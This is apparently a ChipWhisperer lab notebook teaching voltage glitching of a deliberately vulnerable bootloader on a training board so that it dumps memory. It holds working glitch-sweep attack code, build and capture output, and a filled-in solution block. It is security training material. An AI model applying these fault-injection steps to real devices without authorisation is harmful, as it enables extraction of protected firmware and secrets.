Part 2, Topic 3: Voltage Glitching to Dump Memory (MAIN)
========================================================



**SUMMARY:** *In the previous labs, we learned how voltage glitching can
be used for a similar function as clock glitching. We also learned about
how it has fewer limitations, but can be less reliable for certain
target setups. It also changes a great deal based on the properties of
the glitch circuit itself - even changing a wire can have a huge
effect.*

*In this lab, we'll use what we learned in the last lab to again attack
the vulnerable serial printing of the bootloader*

**LEARNING OUTCOMES:**

-  Applying previous glitch settings to new firmware
-  Checking for success and failure when glitching
-  Understanding how compiler optimizations can cause devices to behave
   in strange ways

The Situation
-------------

You should already know the situation from your previous attempts at
glitching this bootloader (as well as what the flaw is). No need to do
big long searches for parameters to try glitching at the beginning of
the loop, just use values that worked well for the previous tutorial.

Be careful that you don't accidentally put the spot we're trying to
glitch outside of ``glitch_spots`` - if you used a repeat > 1, the
actual spot being glitched might be at the end or in the middle of the
repeat!


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'
    allowable_exceptions = None
    CRYPTO_TARGET = 'TINYAES128C'
    VERSION = 'HARDWARE'
    SS_VER = 'SS_VER_2_1'


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM"
    cd ../../../hardware/victims/firmware/bootloader-glitch
    make PLATFORM=$1 CRYPTO_TARGET=NONE


**Out [2]:**



.. parsed-literal::

    make clean\_objs .dep 
    make[1]: Entering directory '/home/cwtests/chipwhisperer/hardware/victims/firmware/bootloader-glitch'
    rm -f -- bootloader-CWLITEARM.hex
    rm -f -- bootloader-CWLITEARM.eep
    rm -f -- bootloader-CWLITEARM.cof
    rm -f -- bootloader-CWLITEARM.elf
    rm -f -- bootloader-CWLITEARM.map
    rm -f -- bootloader-CWLITEARM.sym
    rm -f -- bootloader-CWLITEARM.lss
    rm -f -- objdir-CWLITEARM/\*.o
    rm -f -- objdir-CWLITEARM/\*.lst
    rm -f -- bootloader.s decryption.s stm32f3\_hal.s stm32f3\_hal\_lowlevel.s stm32f3\_sysmem.s
    rm -f -- bootloader.d decryption.d stm32f3\_hal.d stm32f3\_hal\_lowlevel.d stm32f3\_sysmem.d
    rm -f -- bootloader.i decryption.i stm32f3\_hal.i stm32f3\_hal\_lowlevel.i stm32f3\_sysmem.i
    make[1]: '.dep' is up to date.
    make[1]: Leaving directory '/home/cwtests/chipwhisperer/hardware/victims/firmware/bootloader-glitch'
    make begin gccversion build sizeafter fastnote end
    make[1]: Entering directory '/home/cwtests/chipwhisperer/hardware/victims/firmware/bootloader-glitch'
    .
    Welcome to another exciting ChipWhisperer target build!!
    arm-none-eabi-gcc (15:6.3.1+svn253039-1build1) 6.3.1 20170620
    Copyright (C) 2016 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: bootloader.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/bootloader.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/bootloader.o.d bootloader.c -o objdir-CWLITEARM/bootloader.o
    .
    Compiling C: decryption.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/decryption.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/decryption.o.d decryption.c -o objdir-CWLITEARM/decryption.o
    .
    Compiling C: .././hal/stm32f3/stm32f3\_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/stm32f3\_hal.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3\_hal.o.d .././hal/stm32f3/stm32f3\_hal.c -o objdir-CWLITEARM/stm32f3\_hal.o
    .
    Compiling C: .././hal/stm32f3/stm32f3\_hal\_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/stm32f3\_hal\_lowlevel.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3\_hal\_lowlevel.o.d .././hal/stm32f3/stm32f3\_hal\_lowlevel.c -o objdir-CWLITEARM/stm32f3\_hal\_lowlevel.o
    .
    Compiling C: .././hal/stm32f3/stm32f3\_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/stm32f3\_sysmem.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3\_sysmem.o.d .././hal/stm32f3/stm32f3\_sysmem.c -o objdir-CWLITEARM/stm32f3\_sysmem.o
    .
    Assembling: .././hal/stm32f3/stm32f3\_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF\_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CWLITEARM/stm32f3\_startup.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3\_startup.S -o objdir-CWLITEARM/stm32f3\_startup.o
    .
    Linking: bootloader-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL\_TYPE=HAL\_stm32f3 -DPLATFORM=CWLITEARM -DF\_CPU=7372800UL -DSS\_VER\_2\_0=2 -DSS\_VER\_2\_1=3 -DSS\_VER\_1\_1=1 -DSS\_VER\_1\_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEARM/bootloader.o -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/bootloader-CWLITEARM.elf.d objdir-CWLITEARM/bootloader.o objdir-CWLITEARM/decryption.o objdir-CWLITEARM/stm32f3\_hal.o objdir-CWLITEARM/stm32f3\_hal\_lowlevel.o objdir-CWLITEARM/stm32f3\_sysmem.o objdir-CWLITEARM/stm32f3\_startup.o --output bootloader-CWLITEARM.elf --specs=nano.specs --specs=nosys.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=bootloader-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: bootloader-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWLITEARM.elf bootloader-CWLITEARM.hex
    .
    Creating load file for Flash: bootloader-CWLITEARM.bin
    arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWLITEARM.elf bootloader-CWLITEARM.bin
    .
    Creating load file for EEPROM: bootloader-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    --change-section-lma .eeprom=0 --no-change-warnings -O ihex bootloader-CWLITEARM.elf bootloader-CWLITEARM.eep \|\| exit 0
    .
    Creating Extended Listing: bootloader-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z bootloader-CWLITEARM.elf > bootloader-CWLITEARM.lss
    .
    Creating Symbol Table: bootloader-CWLITEARM.sym
    arm-none-eabi-nm -n bootloader-CWLITEARM.elf > bootloader-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       4572	    120	   1296	   5988	   1764	bootloader-CWLITEARM.elf
    +--------------------------------------------------------
    + Default target does full rebuild each time.
    + Specify buildtarget == allquick == to avoid full rebuild
    +--------------------------------------------------------
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm \(STM32F3\) with:
    + CRYPTO\_TARGET = NONE
    + CRYPTO\_OPTIONS = AES128C
    +--------------------------------------------------------
    make[1]: Leaving directory '/home/cwtests/chipwhisperer/hardware/victims/firmware/bootloader-glitch'




**In [3]:**

.. code:: ipython3

    
    #!/usr/bin/env python
    # coding: utf-8
    
    # In[ ]:
    
    
    import chipwhisperer as cw
    
    try:
        if not scope.connectStatus:
            scope.con()
    except NameError:
        scope = cw.scope(hw_location=(1, 97))
    
    try:
        if SS_VER == "SS_VER_2_1":
            target_type = cw.targets.SimpleSerial2
        elif SS_VER == "SS_VER_2_0":
            raise OSError("SS_VER_2_0 is deprecated. Use SS_VER_2_1")
        else:
            target_type = cw.targets.SimpleSerial
    except:
        SS_VER="SS_VER_1_1"
        target_type = cw.targets.SimpleSerial
    
    try:
        target = cw.target(scope, target_type)
    except:
        print("INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.")
        print("INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.")
        scope = cw.scope(hw_location=(1, 97))
        target = cw.target(scope, target_type)
    
    
    print("INFO: Found ChipWhisperer😍")
    
    
    # In[ ]:
    
    
    if "STM" in PLATFORM or PLATFORM == "CWLITEARM" or PLATFORM == "CWNANO":
        prog = cw.programmers.STM32FProgrammer
    elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
        prog = cw.programmers.XMEGAProgrammer
    elif "neorv32" in PLATFORM.lower():
        prog = cw.programmers.NEORV32Programmer
    else:
        prog = None
    
    
    # In[ ]:
    
    
    import time
    time.sleep(0.05)
    scope.default_setup()
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.1)
            scope.io.pdic = 'high_z' #XMEGA doesn't like pdic driven high
            time.sleep(0.1) #xmega needs more startup time
        elif "neorv32" in PLATFORM.lower():
            raise IOError("Default iCE40 neorv32 build does not have external reset - reprogram device to reset")
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high_z'
            time.sleep(0.05)
    
    



**Out [3]:**



.. parsed-literal::

    INFO: Found ChipWhisperer😍




**In [4]:**

.. code:: ipython3

    fw_path = "../../../hardware/victims/firmware/bootloader-glitch/bootloader-{}.hex".format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 4691 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 4691 bytes




**In [6]:**

.. code:: ipython3

    scope.clock.adc_src = "clkgen_x1"
    if PLATFORM == "CWLITEXMEGA":
        scope.clock.clkgen_freq = 32E6
        target.baud = 38400*32/7.37
        def reboot_flush():            
            scope.io.pdic = False
            time.sleep(0.05)
            scope.io.pdic = "high_z"
            time.sleep(0.05)
            #Flush garbage too
            target.flush()
    else:
        scope.clock.clkgen_freq = 24E6
        target.baud = 38400*24/7.37
        def reboot_flush():            
            scope.io.nrst = False
            time.sleep(0.05)
            scope.io.nrst = "high_z"
            time.sleep(0.05)
            #Flush garbage too
            target.flush()
    
    reboot_flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
            
    trig_count = scope.adc.trig_count


**In [7]:**

.. code:: ipython3

    glitch_spots = [i for i in range(1)]
    # ###################
    # Add your code here
    # ###################
    #raise NotImplementedError("Add your code here, and delete this.")
    
    # ###################
    # START SOLUTION
    # ###################
    glitch_spots = list(range(trig_count - 50, trig_count - 5, 1))
    if PLATFORM == "CWLITEXMEGA":
        glitch_spots = list(range(trig_count - 150, trig_count - 5, 1))
    # ###################
    # END SOLUTION
    # ###################
    #Basic setup
    print(glitch_spots)
    scope.glitch.clk_src = "clkgen" # set glitch input clock
    scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch
    scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
    
    scope.io.glitch_hp = True
    scope.io.glitch_lp = True
    print(scope.glitch)
    def my_print(text):
        for ch in text:
            if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
                print(ch, end='')
            else:
                print("0x{:02X}".format(ord(ch)), end='')
            print("", end='')
            
    scope.adc.timeout = 0.1


**Out [7]:**



.. parsed-literal::

    [16932, 16933, 16934, 16935, 16936, 16937, 16938, 16939, 16940, 16941, 16942, 16943, 16944, 16945, 16946, 16947, 16948, 16949, 16950, 16951, 16952, 16953, 16954, 16955, 16956, 16957, 16958, 16959, 16960, 16961, 16962, 16963, 16964, 16965, 16966, 16967, 16968, 16969, 16970, 16971, 16972, 16973, 16974, 16975, 16976]
    clk\_src     = clkgen
    width       = 10.15625
    width\_fine  = 0
    offset      = 10.15625
    offset\_fine = 0
    trigger\_src = ext\_single
    arm\_timing  = after\_scope
    ext\_offset  = 0
    repeat      = 1
    output      = glitch\_only
    




**In [8]:**

.. code:: ipython3

    import matplotlib.pylab as plt
    import chipwhisperer.common.results.glitch as glitch
    gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset"])
    gc.display_stats()
    
    
    fig = plt.figure()
    plt.plot(-48, 48, ' ')
    plt.plot(48, -48, ' ')
    plt.plot(-48, -48, ' ')
    plt.plot(48, 48, ' ')


**Out [8]:**


.. parsed-literal::

    IntText(value=0, description='success count:', disabled=True)



.. parsed-literal::

    IntText(value=0, description='reset count:', disabled=True)



.. parsed-literal::

    IntText(value=0, description='normal count:', disabled=True)



.. parsed-literal::

    FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…



.. parsed-literal::

    FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…




.. parsed-literal::

    [<matplotlib.lines.Line2D at 0x7fb9cd3cd3d0>]




.. image:: img/OPENADC-CWLITEARM-SOLN_Fault2_3-VoltageGlitchingtoMemoryDump_11_6.png



**In [9]:**

.. code:: ipython3

    from importlib import reload
    import chipwhisperer.common.results.glitch as glitch
    from tqdm.notebook import tqdm
    import re
    import struct
    gc.set_global_step([0.4])
    
    if PLATFORM=="CWLITEXMEGA":
        gc.set_range("width", 46.1, 47.8)
        gc.set_range("offset", -20, 20)
        scope.glitch.repeat = 10
    elif PLATFORM == "CWLITEARM":
        gc.set_range("width", 34.8, 43)
        gc.set_range("offset", -38, -30)
        scope.glitch.repeat = 7
    elif PLATFORM == "CW308_STM32F3":
        gc.set_range("width", 45.2, 47.6)
        gc.set_range("offset", -48.65, 48)
        scope.glitch.repeat = 5


**In [10]:**

.. code:: ipython3

    from importlib import reload
    import chipwhisperer.common.results.glitch as glitch
    from tqdm.notebook import tqdm
    import re
    import struct
    import matplotlib.pyplot as plt
    # ###################
    #disable logging
    cw.set_all_log_levels(cw.logging.CRITICAL)
    step = 1
    gc.set_global_step(step)
    
    broken = False
    for glitch_setting in gc.glitch_values():
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.width = glitch_setting[0]
        if broken:
            break
        for i in tqdm(glitch_spots, leave=False):
            scope.glitch.ext_offset = i
            if broken:
                break
            if scope.adc.state:
                #print("Timeout, trigger still high!")
                gc.add("reset", (scope.glitch.width, scope.glitch.offset))
                plt.plot(scope.glitch.width, scope.glitch.ext_offset, 'xr', alpha=1)
                fig.canvas.draw()
    
                #Device is slow to boot?
                reboot_flush()
            target.flush()
            scope.arm()
            target.write("p516261276720736265747267206762206f686c207a76797821\n")
            ret = scope.capture()
            if ret:
                #print('Timeout - no trigger')
                gc.add("reset", (scope.glitch.width, scope.glitch.offset))
                plt.plot(scope.glitch.width, scope.glitch.ext_offset, 'xr', alpha=1)
                fig.canvas.draw()
    
                #Device is slow to boot?
                reboot_flush()
            else:
                time.sleep(0.05)
                output = target.read(timeout=2)
                if "767" in output:
                    print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(i, scope.glitch.offset, scope.glitch.width))
                    plt.plot(scope.glitch.width, scope.glitch.ext_offset, '+g')
                    gc.add("success", (scope.glitch.width, scope.glitch.offset))
                    fig.canvas.draw()
                    broken = True 
                    for __ in range(500):
                        num_char = target.in_waiting()
                        if num_char:
                            my_print(output)
                            output = target.read(timeout=50)
                    time.sleep(1)
                    break
                else:
                    gc.add("normal", (scope.glitch.width, scope.glitch.offset))
                    
    #reenable logging
    cw.set_all_log_levels(cw.logging.WARNING)


**Out [10]:**


.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]



.. parsed-literal::

      0%|          | 0/45 [00:00<?, ?it/s]




.. parsed-literal::

    Glitched!
    	Ext offset: 16932
    	Offset: -35.9375
    	Width: 35.9375




.. image:: img/OPENADC-CWLITEARM-SOLN_Fault2_3-VoltageGlitchingtoMemoryDump_13_13.png



**In [11]:**

.. code:: ipython3

    scope.dis()
    target.dis()


**In [12]:**

.. code:: ipython3

    assert broken == True
